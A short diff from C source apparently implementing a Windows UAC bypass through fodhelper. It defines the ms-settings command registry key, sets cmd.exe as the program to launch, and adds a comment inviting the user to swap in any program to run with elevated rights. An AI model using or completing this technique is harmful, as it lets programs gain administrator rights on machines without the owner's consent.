@@ -24,7 +24,7 @@
 #include "hiddencalls.h"
 
 #define KEYONE "Software\\Classes\\ms-settings\\Shell\\open\\command"
-#define PROGRAM "cmd.exe"
+#define PROGRAM "cmd.exe" // you can change it to whatever program you want to run escalated
 
 BOOL vxCreateFodhelperKey(LPSTR path) {
 
